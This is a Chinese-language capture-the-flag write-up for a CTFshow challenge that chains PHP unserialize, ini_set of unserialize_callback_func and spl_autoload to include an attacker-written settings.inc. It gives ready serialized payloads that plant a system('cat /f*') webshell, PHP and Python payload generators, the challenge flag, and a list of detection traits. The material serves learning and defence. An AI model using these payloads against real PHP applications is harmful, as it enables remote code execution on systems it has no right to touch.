# CTF PHP反序列化 + SplAutoload 文件包含经验

## 题目类型
PHP反序列化链 + spl_autoload任意文件包含

## 靶场信息
- 平台: CTFshow
- URL: https://afad644e-451b-4afa-9108-bacb3fb59523.challenge.ctf.show/
- Flag: ctfshow{3e5ecb14-5327-4226-8fc7-18e773770298}

## 漏洞分析

### 源码结构
```php
<?php
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
            'display_errors'=>'On',
            'allow_url_fopen'=>'On'
        );
        $this->params=array();
    }

    public function __wakeup(){
        foreach ($this->settings as $key => $value) {
            ini_set($key, $value);  // 可控配置
        }
    }

    public function __destruct(){
        file_put_contents('settings.inc', unserialize($this->params));  // 文件写入点
    }
}

unserialize($_GET['data']);
```

### 攻击链
1. **第一步**：设置 `unserialize_callback_func = spl_autoload`，写入PHP代码到 `settings.inc` (文件内容被unserialize后的值控制)
2. **第二步**：反序列化不存在的类触发 `spl_autoload`，自动包含 `settings.inc` 执行代码

## 攻击Payload

### Step 1: 写入WebShell到 settings.inc
```
O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:32:"s:24:"<?php system('cat /f*');";";}
```

**关键**：params的值是序列化的字符串 `s:24:"<?php system('cat /f*');";`，反序列化后得到`<?php system('cat /f*');`**写入** settings.inc

### Step 2: 触发spl_autoload包含
```
O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:19:"O:8:"settings":0:{}";}
```

**关键**：
- 尝试反序列化类 `settings`
- 该类不存在，触发 `spl_autoload("settings")`
- `spl_autoload` 默认查找并包含 `settings.inc`
- 执行写入的PHP代码，获得flag

## 核心知识点

### 1. unserialize_callback_func
- PHP配置选项，反序列化不存在的类时触发的回调函数
- 可设置为 `spl_autoload` 实现自动加载

### 2. spl_autoload 行为
- 默认尝试加载 `{类名}.inc` 或 `{类名}.php`
- 可以用于文件包含攻击（当 `settings.inc` 包含恶意代码时）

### 3. 嵌套反序列化技巧
```php
// payload构造思路
$params = serialize("<?php system('cat /flag');");
// 这样unserialize($params)返回的是PHP代码字符串，写入文件
```

## 通用POC生成器

```php
<?php
// Step 1: 生成写入WebShell的payload
class main{
    public $settings;
    public $params;
    public function __construct(){
        $this->settings=array(
            'unserialize_callback_func'=>'spl_autoload',
        );
        // 嵌套序列化：让unserialize后得到恶意代码
        $this->params=serialize("<?php system('cat /flag');");
    }
}
$a = new main();
echo urlencode(serialize($a));

// Step 2: 生成触发spl_autoload的payload
class main2{
    public $settings;
    public $params;
    public function __construct(){
        $this->settings=array(
            'unserialize_callback_func'=>'spl_autoload',
        );
        // 反序列化不存在的类触发spl_autoload
        $this->params=serialize(new settings());  // settings类不存在
    }
}
$a2 = new main2();
echo urlencode(serialize($a2));
?>
```

## 检测特征
1. 类包含 `__wakeup()` + `ini_set()` 循环（配置可控）
2. `__destruct()` 中有 `file_put_contents(filename, unserialize(...))` 操作
3. 文件名包含类名（如 `settings.inc`）
4. 提示中提到 "反序列化"、"spl_autoload" 等关键词

## 变种利用
- 类似题目可能使用 `include/require` 代替 `unserialize_callback_func`
- 可能结合 `php://filter` 包装器进行编码绕过
- 可能使用 `data://` 包装器直接执行代码

## 参考备忘
```python
# Python POC快速生成
import urllib.parse

# Step 1 payload (写入代码)
step1 = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:32:"s:24:\"<?php system(\'cat /f*\');\";";}'

# Step 2 payload (触发包含)
step2 = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:19:"O:8:\"settings\":0:{}";}'

url = "https://target.com/?data=" + urllib.parse.quote(step2)
```

## 标签
#php #deserialization #spl_autoload #lfi #rce #file-include

## 创建时间
2026-03-17
